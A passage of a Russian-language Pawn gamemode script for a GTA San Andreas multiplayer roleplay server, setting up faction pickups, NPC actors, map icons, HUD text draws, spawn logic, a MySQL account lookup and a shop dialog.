 	FracPic[F_BIKERS-6] = CreateDynamicPickup(1279,23,2817.3611,-1167.6019,1029.1719,F_BIKERS);
	TextOrg[F_AZTECAS-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,-191.1655,96.4780,-25.6751,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_AZTECAS);
 	FracPic[F_AZTECAS-6] = CreateDynamicPickup(1279,23,-191.1655,96.4780,-26.6751,F_AZTECAS);
 	TextOrg[F_VAGOS-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,-191.1655,96.4780,-25.6751,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_VAGOS);
 	FracPic[F_VAGOS-6] = CreateDynamicPickup(1279,23,-191.1655,96.4780,-26.6751,F_VAGOS);
 	TextOrg[F_RIFA-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,-191.1655,96.4780,-25.6751,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_RIFA);
 	FracPic[F_RIFA-6] = CreateDynamicPickup(1279,23,-191.1655,96.4780,-26.6751,F_RIFA);
 	FracPic[F_LCN-6] = CreateDynamicPickup(1279,23,1951.0082,264.9018,1371.4232,F_LCN);
    TextOrg[F_LCN-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,1951.0082,264.9018,1372.4232,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_LCN);
    FracPic[F_YAKUZA-6] = CreateDynamicPickup(1279,23,1951.0082,264.9018,1371.4232,F_YAKUZA);
    TextOrg[F_YAKUZA-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,1951.0082,264.9018,1372.4232,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_YAKUZA);
    FracPic[F_RM-6] = CreateDynamicPickup(1279,23,1951.0082,264.9018,1371.4232,F_RM);
    TextOrg[F_RM-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,1951.0082,264.9018,1372.4232,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_RM);
 	
    

    UpdateMat(F_GROVE);
 	UpdateMat(F_BALLAS);
 	UpdateMat(F_BIKERS);
	UpdateMat(F_AZTECAS);
	UpdateMat(F_VAGOS);
	UpdateMat(F_RIFA);
	UpdateMat(F_LCN);
	UpdateMat(F_YAKUZA);
	UpdateMat(F_RM);
 	CreateDynamic3DTextLabel("Местоположения важных точек\nВзаимодействие: {f7ae11}H",0xFFFFFFFF,-194.3029,92.7505,-26.2155+0.5,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
	CreateDynamicObject(19166, -194.25, 93.10, -25.66, 90.29, 0.00, 0.00);


    CreateDynamic3DTextLabel("Открыть все камеры\nВзаимодействие: {f7ae11}H",0xFFFFFFFF,0.0776,-38.0407,2003.0779,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 1);

	CreateDynamic3DTextLabel("Местоположения важных точек\nВзаимодействие: {f7ae11}H",0xFFFFFFFF,2771.35, -69.61, 1318.71+0.5,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
	CreateDynamicObject(19166, 2771.35, -69.61, 1318.75, 0.00, 0.00, 0.00);
 	KaznaText = CreateDynamic3DTextLabel("1",0xFFFFFFFF,208.4121,-127.0917,1001.2260,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 2);
 	UpdateKazna();
 	BityPic[0] = CreateDynamicPickup(336,23,-193.4805,97.5756,-26.6751,F_AZTECAS);
 	BityPic[1] = CreateDynamicPickup(336,23,-193.4805,97.5756,-26.6751,F_GROVE);
 	BityPic[2] = CreateDynamicPickup(336,23,-193.4805,97.5756,-26.6751,F_BIKERS);
 	CreateDynamicObject(19802, 2813.96460, -1167.43030, 1028.16931,   0.00000, 0.00000, 90.00000,F_BIKERS,-1,-1,400.000,400.000);
  	
    CreateDynamic3DTextLabel("{f7ae11}[Торговая площадка]",0xFFFFFFFF,1402.8395,-21.0347,1002.2961,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 55);
	torgpic = CreateDynamicPickup(1274,23,1402.8395,-21.0347,1001.2961,55);
	CreateDynamic3DTextLabel("{f7ae11}[Торговая площадка]",0xFFFFFFFF,1056.7345,2919.9089,1052.8601,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 1);
	blacktorgpic = CreateDynamicPickup(1274,23,1056.7345,2919.9089,1051.8601,1);
	
	MeriaBot = CreateDynamicActor(228,1405.0687,-18.2661,1001.2981,88.9265,1,100.0,55);
//	SetActorVirtualWorld(MeriaBot,2);
	new str[140];
	for(new i = 0; i < sizeof(Koyka); i++)
	{
	    if(i > 15) format(str,sizeof(str),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Свободна{ffffff}\nЦена: {f7ae11}%d${ffffff}\nИспользуйте: {f7ae11}H",KoykaCena);
 		else format(str,sizeof(str),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Свободна{ffffff}\nЦена: {f7ae11}Бесплатно{ffffff}\nИспользуйте: {f7ae11}H");
	  	KoykaText[i] = CreateDynamic3DTextLabel(str,-1,Koyka[i][0],Koyka[i][1],Koyka[i][2],15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 2,2);
	}
	MeriaText = CreateDynamic3DTextLabel("Взаимодействие: {f7ae11}H",-1,1405.0687,-18.2661,1002.2981,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 55);
	/*= Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,1405.0687,-18.2661,1002.2981,10.0, 55, 1 );*/
	CreateDynamicActor(81,766.0010,0.6090,1000.7177,317.2148,1,100.0,-1);
	
	
//	SetActorVirtualWorld(SportBot,1);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,766.0010,0.6090,1001.7177,10.0, -1, 0 );
	
	CreateDynamicActor(217,1405.0065,-36.4216,1000.9182,1.8190,1,100.0,50,46);
	CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1,11405.0065,-36.4216,1000.9182+1,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 50,46);
	
	BotGruz = CreateDynamicActor(153,1583.3193,704.1998,10.7680,324.8623);
	TextGruz = Create3DTextLabelEx( "-",0xC2C2C220,1583.3193,704.1998,11.7680,10.0, 0, 0 );
	
	ShveiBot = CreateDynamicActor(153,2851.3872,-1207.6235,1027.8799,314.7546,1,100.0,1);
//	SetActorVirtualWorld(ShveiBot,1);
	ShveiText = Create3DTextLabelEx( "-",0xC2C2C220,2851.3872,-1207.6235,1028.8799,10.0, 0, 1 );
	shevipic = CreateDynamicPickup(1275,23,2852.5977,-1206.5475,1027.8799,1);
	BotPes = CreateDynamicActor(153,-1265.9578,2701.8149,50.1734,119.9015);
	pespic = CreateDynamicPickup(1275,23,-1267.0903,2700.9519,50.1734,0);
	TextPes = Create3DTextLabelEx( "-",0xC2C2C220,-1265.9578,2701.8149,51.1734,10.0, 0, 1 );

	for(new i = 0; i < sizeof(Bankomats); i++)
	{
	    if(i < 2) CreateDynamic3DTextLabel( "Используйте: {f7ae11}LALT",-1,Bankomats[i][0],Bankomats[i][1],Bankomats[i][2],10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1,3);
	    else if(i > 1)
		{
		    CreateDynamic3DTextLabel( "Используйте: {f7ae11}LALT",-1,Bankomats[i][0],Bankomats[i][1],Bankomats[i][2],10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,2,66);
			CreateDynamic3DTextLabel( "Используйте: {f7ae11}LALT",-1,Bankomats[i][0],Bankomats[i][1],Bankomats[i][2],10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1,66);
		}
	}
	for(new i = 0; i < sizeof(BankBots); i++)
	{
	    BankSp[i] = CreateDynamicSphere(BankBots[i][b_Coords][0],BankBots[i][b_Coords][1],BankBots[i][b_Coords][2], 3.0,BankBots[i][b_Virt],BankBots[i][b_Int]);
		BankBot[i] = CreateDynamicActor(150,BankBots[i][b_Coords][0],BankBots[i][b_Coords][1],BankBots[i][b_Coords][2],BankBots[i][b_Coords][3],1,100.0,BankBots[i][b_Virt],BankBots[i][b_Int]);
		BankText[i] = CreateDynamic3DTextLabel( "Взаимодействие: {f7ae11}H",-1,BankBots[i][b_Coords][0],BankBots[i][b_Coords][1],BankBots[i][b_Coords][2]+1,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,BankBots[i][b_Tes],BankBots[i][b_Virt],BankBots[i][b_Int]);
	}
	CreateDynamicActor(150,1375.2639,-30.3924,1000.9133,89.5459,1,100.0,1,66);
	CreateDynamic3DTextLabel( "{f7ae11}[Получение карты]",-1,1373.4906,-30.5385,1000.9133+1,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,1,66);
	bankpic[0] = CreateDynamicPickup(1581,23,1373.4906,-30.5385,1000.9133,1,66);
	
	CreateDynamicActor(150,1375.2639,-30.3924,1000.9133,89.5459,1,100.0,2,66);
	CreateDynamic3DTextLabel( "{f7ae11}[Получение карты]",-1,1373.4906,-30.5385,1000.9133+1,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,2,66);
	bankpic[1] = CreateDynamicPickup(1581,23,1373.4906,-30.5385,1000.9133,2,66);
	
	container = CreateDynamicPickup(1239,23,2794.7463,-2399.9036,13.6320,0,0);
	CreateDynamicActor(227,2796.1521,-2399.9270,13.6316,88.4306,1,100.0,0,0);
	CreateDynamic3DTextLabel( "{f7ae11}[Контейнеры]",-1,2794.7463,-2399.9036,13.6320+1,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,0,0);
//	BankBot[0] = CreateDynamicActor(150,9.4034,2.0507,1996.0850,89.2630,1,100.0,1,3);
//	BankBot[1] = CreateDynamicActor(150,9.4040,-2.0627,1996.0850,91.1431,1,100.0,1,3);
//	SetActorVirtualWorld(BankBot[0],1);
//	SetActorVirtualWorld(BankBot[1],1);
//	BankText[0] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,9.4034,2.0507,1997.0850,10.0, 1, 0 );
//	BankText[1] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,9.4040,-2.0627,1997.0850,10.0, 1, 0 );

	CreateDynamicObject(1569, 1564.16, -1667.15, 27.39, 0.00, 0.00, 0.00);
	


	//NARKOPRITON
	CreateDynamicObjectEx(19395, 730.12695, -10.47266, 1001.47803,   0.00000, 0.00000, 90.00000);
	CreateDynamicObjectEx(14782, 723.24799, 10.87600, 1000.74799,   0.00000, 0.00000, 0.00000);
	CreateDynamicObjectEx(14779, 725.66602, 3.54700, 1001.19800,   0.00000, 0.00000, 0.00000);
	CreateObject(14794, 722.59875, 0.38732, 1002.12000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObjectEx(15037, 714.86902, -3.82400, 1000.10498,   0.00000, 0.00000, 0.00000);
	CreateDynamicObjectEx(936, 717.19800, -9.52800, 1000.16803,   0.00000, 0.00000, 180.00000);
	CreateDynamicObjectEx(941, 719.09003, -9.56700, 1000.16901,   0.00000, 0.00000, 0.00000);
	CreateDynamicObjectEx(1416, 732.52301, -4.31100, 1000.26202,   0.00000, 0.00000, 90.00000);
	CreateDynamicObjectEx(1421, 713.40198, 10.34300, 1000.46100,   0.00000, 0.00000, 90.00000);
	CreateDynamicObjectEx(1742, 727.58502, -10.19900, 1000.95801,   0.00000, 0.00000, 179.99451);
	CreateDynamicObjectEx(1743, 727.89099, -8.60100, 999.69800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObjectEx(1421, 713.39502, 8.63900, 1000.46100,   0.00000, 0.00000, 90.00000);
	CreateDynamicObjectEx(1744, 732.97803, -7.55200, 1000.70001,   0.00000, 0.00000, 270.00000);
	CreateDynamicObjectEx(1744, 732.97400, -5.60200, 1000.70001,   0.00000, 0.00000, 270.00000);
	CreateDynamicObjectEx(1742, 732.99902, -7.78100, 1001.05701,   0.00000, 0.00000, 270.00000);
	CreateDynamicObjectEx(1742, 732.96698, -5.92100, 1001.05701,   0.00000, 0.00000, 270.00000);
	CreateDynamicObjectEx(1755, 713.55103, -2.41600, 999.69000,   0.00000, 0.00000, 40.00000);
	CreateDynamicObjectEx(1755, 715.45099, -1.90300, 999.69000,   0.00000, 0.00000, 329.99573);
	CreateDynamicObjectEx(1755, 717.45599, -3.28600, 999.69000,   0.00000, 0.00000, 269.99084);
	CreateDynamicObjectEx(2025, 732.36798, -2.09100, 999.69000,   0.00000, 0.00000, 270.00000);
	CreateDynamicObjectEx(2063, 730.90503, 10.88600, 1000.60699,   0.00000, 0.00000, 0.00000);
	CreateDynamicObjectEx(1421, 727.99200, 10.81300, 1000.46100,   0.00000, 0.00000, 0.00000);
	CreateDynamicObjectEx(2568, 716.10901, -9.57500, 999.69800,   0.00000, 0.00000, 180.00000);
	CreateDynamicObjectEx(1498, 729.30731, -10.41390, 999.70660,   0.00000, 0.00000, 0.00000);



    CreateDynamicMapIcon(1895.5316,-2021.3472,13.5469,58, 0,-1,-1,-1,200.0);
	CreateDynamicMapIcon(2000.0116,-1114.0570,27.1250,59, 0,-1,-1,-1,200.0);
	CreateDynamicMapIcon(2495.1497,-1687.9913,13.5270,62, 0,-1,-1,-1,200.0);
	CreateDynamicMapIcon(2809.7793,-1172.5356,32.6688,60, 0,-1,-1,-1,200.0);
	CreateDynamicMapIcon(2301.1482,-1892.6466,23.3389,61, 0,-1,-1,-1,200.0);
	
	CreateDynamicMapIcon(2461.5815,2241.9773,10.8203,52, 0,-1,-1,-1,200.0);
	CreateDynamicMapIcon(1466.4500,-1027.4900,23.8281,52, 0,-1,-1,-1,200.0);
	
	CreateDynamicMapIcon(-303.9354,1050.9486,26.0125,22, 0,-1,-1,-1,200.0); // полисе депортамент
	
	CreateDynamicMapIcon(1534.57,-1672.76,13.3828,30, 0,-1,-1,-1,200.0); // полисе депортамент
	
	
	
	CreateDynamicMapIcon(1172.0773,-1325.3113,15.4073,22, 0,-1,-1,-1,200.0); // болька лс
	
	CreateDynamicMapIcon(-175.3100,1133.4319,25.2743,52, 0,-1,-1,-1,200.0); //bank

	
	CreateDynamicMapIcon(2031.087768,1007.999938,10.820312,44, 0,-1,-1,-1,200.0); //casino
	
	CreateDynamicMapIcon(1479.8514,-1769.2173,18.7958,40, 0,-1,-1,-1,200.0); //meria
	
	
	CreateDynamicMapIcon(2228.3596,-1723.7959,13.5514,54, 0,-1,-1,-1,200.0); //kachalka
	CreateDynamicMapIcon(1966.4340,2294.7051,16.4559,54, 0,-1,-1,-1,200.0); //kachalka

    CreateDynamicMapIcon(2102.8611,2070.269531,10.4628,55, 0,-1,-1,-1,200.0); //arenda
    CreateDynamicMapIcon(348.162,-1783.94,5.306,55, 0,-1,-1,-1,200.0); //arenda
    
    
    CreateDynamicMapIcon(-39.760299,1165.8651,19.0531,55, 0,-1,-1,-1,200.0); //arenda
    
    CreateDynamicMapIcon(1629.2667,972.0903,10.8203,33, 0,-1,-1,-1,200.0); //rega mp
    
 //	CreateDynamicMapIcon(2131.4177,1405.3508,16.0619,55, 0,-1,-1,-1,200.0);
   //	CreateDynamicMapIcon(1736.4004,1953.9949,15.8790,55, 0,-1,-1,-1,200.0);
   	//CreateDynamicMapIcon(-1514.6766,2523.7529,55.8076,55, 0,-1,-1,-1,200.0);

//	CreateDynamicMapIcon(-553.2263,-180.7986,78.4063,11, 0,-1,-1,-1,200.0);
//	CreateDynamicMapIcon(2776.2019,-2406.7949,13.6410,11, 0,-1,-1,-1,200.0);

//	CreateDynamicMapIcon(1519.1146,-1494.1980,13.0779,27, 0,-1,-1,-1,200.0);
	CreateDynamicMapIcon(2309.8481,1795.1025,10.8203,27, 0,-1,-1,-1,200.0);
	Golod = CreateProgressBar(548.00, 38.00, 57.00, 4.00, 290522623, 100.0,1);
	//===============
	
//	Streamer_VisibleItems(STREAMER_TYPE_OBJECT, 1000);
//	Streamer_SetVisibleItems(STREAMER_TYPE_OBJECT,1000);
	
	//===============
	//int ash
	
	healpic[0] = CreateDynamicPickup(1582, 23, 305.3476,300.9164,999.1484,1);
	healpic[1] = CreateDynamicPickup(1582, 23, -0.0590,-57.1856,1999.5900,1);
	healpic[2] = CreateDynamicPickup(1582, 23, 1373.6818,-21.0758,1000.9143,2,2);
	

	WorkPic[0] = CreateDynamicPickup(1275, 23,1413.1411,-42.7770,1000.9143,55);
	WorkPic[1] = CreateDynamicPickup(1275, 23, 1387.3135,-51.3363,1000.9153,2);
	WorkPic[2] = CreateDynamicPickup(1275, 23, 229.2938,168.8848,1003.0234,1);
	WorkPic[3] = CreateDynamicPickup(1275, 23, 1747.4614,-1349.0062,1569.0170,1);
	WorkPic[4] = CreateDynamicPickup(1275, 23, -11.6629,-13.4915,1999.5859,1);
	WorkPic[5] = CreateDynamicPickup(1275, 23, -9.7311,-10.5951,1999.9159,3);
	WorkPic[6] = CreateDynamicPickup(1275, 23, 1490.5563,-1070.5029,1025.0059,2);
	WorkPic[7] = CreateDynamicPickup(1275, 23, 1.1863,-53.0770,2003.0743,1);
	WorkPic[8] = CreateDynamicPickup(1275, 23, 1977.1202,1345.5962,1015.4606,17);
	WorkPic[9] = CreateDynamicPickup(1275, 23, 1374.2001,2.5015,1005.2794,65);
	secupdate = SetTimer("SecUpdate", 1000, 1);

    OSN[0] = TextDrawCreate(554.166625, 14.103674, "Maryland"); // Text element
	TextDrawLetterSize(OSN[0], 0.218327, 1.346963);
	TextDrawAlignment(OSN[0], 1);
	TextDrawColor(OSN[0], -36827905);
	TextDrawUseBox(OSN[0], true);
	TextDrawBoxColor(OSN[0], 0);
	TextDrawSetShadow(OSN[0], 0);
	TextDrawSetOutline(OSN[0], 1);
	TextDrawBackgroundColor(OSN[0], -36828160);
	TextDrawFont(OSN[0], 2);
	TextDrawSetProportional(OSN[0], 1);



	OSN[1] = TextDrawCreate(595.166625, 30.951858, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(OSN[1], 0.000000, 0.000000);
	TextDrawTextSize(OSN[1], 2.333322, 2.903700);
	TextDrawAlignment(OSN[1], 1);
	TextDrawColor(OSN[1], 623191551);
	TextDrawSetShadow(OSN[1], 0);
	TextDrawSetOutline(OSN[1], 0);
	TextDrawFont(OSN[1], 4);

	OSN[2] = TextDrawCreate(597.500366, 29.707395, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(OSN[2], 0.000000, 0.000000);
	TextDrawTextSize(OSN[2], 3.666655, 4.562959);
	TextDrawAlignment(OSN[2], 1);
	TextDrawColor(OSN[2], 623191551);
	TextDrawSetShadow(OSN[2], 0);
	TextDrawSetOutline(OSN[2], 0);
	TextDrawFont(OSN[2], 4);

	OSN[3] = TextDrawCreate(599.833374, 27.218507, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(OSN[3], 0.000000, 0.000000);
	TextDrawTextSize(OSN[3], 4.999989, 6.222218);
	TextDrawAlignment(OSN[3], 1);
	TextDrawColor(OSN[3], 623191551);
	TextDrawSetShadow(OSN[3], 0);
	TextDrawSetOutline(OSN[3], 0);
	TextDrawFont(OSN[3], 4);


	OSN[4] = TextDrawCreate(561.499755, 26.048124, "ROLEPLAY"); // Text element
	TextDrawLetterSize(OSN[4], 0.210665, 0.944592);
	TextDrawAlignment(OSN[4], 1);
	TextDrawColor(OSN[4], 623191551);
	TextDrawUseBox(OSN[4], true);
	TextDrawBoxColor(OSN[4], 0);
	TextDrawSetShadow(OSN[4], 0);
	TextDrawSetOutline(OSN[4], 1);
	TextDrawBackgroundColor(OSN[4], 696307968);
	TextDrawFont(OSN[4], 1);
	TextDrawSetProportional(OSN[4], 1);

	OSN[5] = TextDrawCreate(549.166809, 18.092588, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(OSN[5], 0.000000, 0.000000);
	TextDrawTextSize(OSN[5], 4.999989, 6.222218);
	TextDrawAlignment(OSN[5], 1);
	TextDrawColor(OSN[5], -36827905);
	TextDrawSetShadow(OSN[5], 0);
	TextDrawSetOutline(OSN[5], 0);
	TextDrawFont(OSN[5], 4);

	OSN[6] = TextDrawCreate(550.500244, 14.774065, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(OSN[6], 0.000000, 0.000000);
	TextDrawTextSize(OSN[6], 3.666655, 4.562959);
	TextDrawAlignment(OSN[6], 1);
	TextDrawColor(OSN[6], -36827905);
	TextDrawSetShadow(OSN[6], 0);
	TextDrawSetOutline(OSN[6], 0);
	TextDrawFont(OSN[6], 4);

	OSN[7] = TextDrawCreate(552.833435, 13.529626, "LD_BEAT:chit"); // Texture element
	TextDrawLetterSize(OSN[7], 0.000000, 0.000000);
	TextDrawTextSize(OSN[7], 2.333322, 2.903700);
	TextDrawAlignment(OSN[7], 1);
	TextDrawColor(OSN[7], -36827905);
	TextDrawSetShadow(OSN[7], 0);
	TextDrawSetOutline(OSN[7], 0);
	TextDrawFont(OSN[7], 4);




	/*zdan =*/
	//CreateObject(5882, 1316.57813, -984.78906, 86.89063,   0.00000, 0.00000, 0.00000);
//	LoadVeh2();
    LoadVeh1();
    LoadDM();
    LoadWanted();
    BildboardLoad();
    UpdateTopGang();
/*    for(new i = 0; i < TOTALBIL; i++)
    {
        query = "";
		format(query, sizeof(query), "UPDATE `billboards` SET `bDay` = 0, `bOwner` = '-', `bText` = '-', `bFontSize` = 25, `bAligment` = 1, `bBackColor` = 1, `bFontFace` = 0 WHERE `id` = %i",i);
		mysql_tquery(mysql,query);
    }*/
    printf("//////////////////////////// %d",Streamer_CountItems(STREAMER_TYPE_ACTOR,1));
    for(new i = 0; i < Streamer_CountItems(STREAMER_TYPE_ACTOR,1); i++)
    {
        GetDynamicActorPos(i,ActorInfo[i][ax],ActorInfo[i][ay],ActorInfo[i][az]);
		GetDynamicActorFacingAngle(i,ActorInfo[i][aa]);
    }
   /* for(new i = 1; i < 85; i++)
    {
        if(!IsValidObject(i)) continue;
        DestroyObject(i);
    }*/
	for(new p=0;p< MAX_VEHICLES;p++)
	{
		GetVehiclePos(p, veh__pos[p][0], veh__pos[p][1], veh__pos[p][2]);
		GetVehicleZAngle(p, veh__pos[p][3]);
		Locked[p] = -1, serverveh[p] = 1;
		ServerHPVehicle[p] = 1000.0;
        RentCar[p] = -1;
        if(p >= rentcar[0] && p <= rentcar[1]) Fuel[p] = 100;
        if(p >= muscar[0] && p <= muscar[1])
		{
		    CarLable[p] = CreateDynamic3DTextLabel("Мусоровоз\n{f7ae11}[Аренда]", -1, 0.0, 0.0, 1.0, 10.0, INVALID_PLAYER_ID,p, 1 );
		    Fuel[p] = 100;

		}
		if(p >= washcar[0] && p <= washcar[1])
		{
		    CarLable[p] = CreateDynamic3DTextLabel("Уборщик улиц\n{f7ae11}[Аренда]", -1, 0.0, 0.0, 1.0, 10.0, INVALID_PLAYER_ID,p, 1 );
		    //Загруженно: {f7ae11}10/10 л.
		    BInfo[p][bWork] = 10;
		    Fuel[p] = 100;
		}
		if(IsInv(p))
		{
			GetVehicleParamsEx(p,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(p,VEHICLE_PARAMS_ON,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
			Engine[p] = true;
			Lights[p] = true;
		}
	}
	return 1;
}

public OnGameModeExit()
{
    mysql_close();
    
    KillTimer(secupdate);
	return 1;
}
public OnPlayerRequestSpawn(playerid)
{
	SendClientMessage(playerid,CGREY,"В данный момент вам недоступна данная функция!");
	return 0;
}
public OnPlayerRequestClass(playerid, classid)
{
    if(IsPlayerNPC(playerid))
    {
        printf("/// 1 1");
		new playername[64];
		GetPlayerName(playerid,playername,64);

	 	if(!strcmp(playername,"MyFirstNPC",true)) {
	 	    printf("/// 2 2");
	        SetSpawnInfo(playerid,7,255,1427.1503,2632.3489,10.8203,88.6309,-1,-1,-1,-1,-1,-1); SpawnPlayer(playerid);}
	        
		return 1;
	}
	if(PlayerLogged[playerid] == true)
	{
		printf("Залогинен");
		switch(PlayerInfo[playerid][pSpawn])
		{
			case 0:	SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1678.6046,1448.5035,10.7750,276.8253, -1, -1, -1, -1, -1, -1);
			case 1: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2845.8662,1291.0157,11.3906,90.0034, -1, -1, -1, -1, -1, -1);
			case 2: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2222.8694,1839.0148,10.8203,89.8207, -1, -1, -1, -1, -1, -1);
			case 3: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1446.6733,-2286.7068,13.5469,-1, -1, -1, -1, -1, -1, -1); //plane
			case 4: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1759.8630,-1894.8911,13.5608,-1, -1, -1, -1, -1, -1, -1); //jsld
			case 5: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1243.1993,-1699.4054,14.8672,-1, -1, -1, -1, -1, -1, -1); //car
			
		}
		SpawnPlayer(playerid);
	}
	else
	{
	    for(new o; o < 24; o++) SendClientMessage(playerid,-1, "");
	    SendClientMessage(playerid,-1,"Добро пожаловать на сервер Maryland Role Play");
	    printf("Заходит");
   		SetPlayerVirtualWorld(playerid,playerid);
		if(random(2))
		{
		    InterpolateCameraPos(playerid, 2063.322021, 924.981018, 97.196006, 2167.125976, 1042.796020, 57.193752, 5000);
			InterpolateCameraLookAt(playerid, 2065.272705, 929.197387, 95.347366, 2163.791259, 1046.351196, 56.079559, 5000);
		    SetPlayerPos(playerid,2104.3057,953.5743,15.7348);
	    }
	    else
	    {
	        InterpolateCameraPos(playerid, 2321.986328, -1347.209350, 66.416938, 2356.347167, -1447.072143, 40.459991, 5000);
			InterpolateCameraLookAt(playerid, 2323.611816, -1351.548583, 64.538421, 2351.637451, -1445.519531, 39.821121, 5000);
			SetPlayerPos(playerid,2357.3154,-1470.0980,23.9901);
	    }
		for(new i = 0;i <= 7; i++) TextDrawShowForPlayer(playerid,OSN[i]);
		query = "";
		format(query, sizeof(query), "SELECT * FROM `accounts` WHERE `name` = '%s' LIMIT 1", PlayerInfo[playerid][pSendername]);
		mysql_tquery(mysql, query, "CheckReg", "d", playerid);
	    /*format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'", PlayerInfo[playerid][pSendername]);
		mysql_tquery(mysql,query);
		mysql_store_result();
		if(mysql_fetch_row_format(query))
		{
		    printf("в базе");
		    static const fmt_str[] = "{FFFFFF}Ваш ник: {f7ae11}%s{FFFFFF}\n\n{FFFFFF}Вы зарегистрированы на сервере.\nВведите свой пароль, указанный при регистрации:";
		    new str1[sizeof(fmt_str)+MAX_PLAYER_NAME];
		    format(str1, sizeof(str1), fmt_str, PlayerInfo[playerid][pSendername]);
			ShowPlayerDialog(playerid, 2, DIALOG_STYLE_PASSWORD, "Авторизация", str1, "Войти","Отмена");
		}
		else
		{
		    printf("Не в базе");
		    static const fmt_str[] = "{FFFFFF}Добро пожаловать на сервер {f7ae11}Maryland Role Play!{FFFFFF}\nДля начала игры на нашем сервере, вам необходимо пройти регистрацию.\n\nВ строчку ниже введите пароль для вашего аккаунта.\nОн будет запрашиваться каждый раз, когда вы заходите на сервер.\n\n{F85A5A}- Пароль может состоять из русских и латинских символов\n- Пароль чувствителен к регистру\n- Длина пароля может быть от 5-ти до 16-ти символов";
			new str[sizeof(fmt_str)+MAX_PLAYER_NAME];
			format(str, sizeof(str), fmt_str);
			ShowPlayerDialog(playerid, 1, DIALOG_STYLE_INPUT, "Регистрация | Шаг [1/8]", str, "Далее","");
		}
		mysql_free_result();*/
	}
	return 1;
}
stock ShowMenuBiz(playerid)
{
	new str[144];
	switch(BizInfo[GetPVarInt(playerid,"PBIZ")][bType])
	{
	    case 1:
		{
		    if(PlayerInfo[playerid][pLic][L_GUN] == 0)
		    {
		        ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
				Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"У вас нет лицензии");
				SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
				return true;
		    }
	    	query = "";
      		if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
			{
			    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
				strcat(query,str);
			}
			format(str,sizeof(str),"Оружие\t{f7ae11}[Смотреть]{ffffff}\nТир\t{f7ae11}[%d$]{ffffff}\n",ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][7]);
			strcat(query,str);
			format(str,sizeof(str),"Бронежилет\t{f7ae11}[%d$]{ffffff}",ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][8]);
			strcat(query,str);
	    	ShowPlayerDialog(playerid,158,DIALOG_STYLE_TABLIST,"Ammo",query,"Далее","Назад");
		 /*   format(srrt,sizeof(srrt),"Оплата\t%s\n{FFFFFF}Кастет\t[%i$]\nБита\t[%i$]\nДымовая шашка (10 шт.)\t[%i$]\nDesert Eagle (60 пт.)\t[%i$]\nShotgun (30 пт.)\t[%i$]\nAK-47 (90 пт.)\t[%i$]\nCountry Rifle (30 пт.)\t[%i$]\nТир\t[%i$]\nБронежилет\t[%i$]",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"),
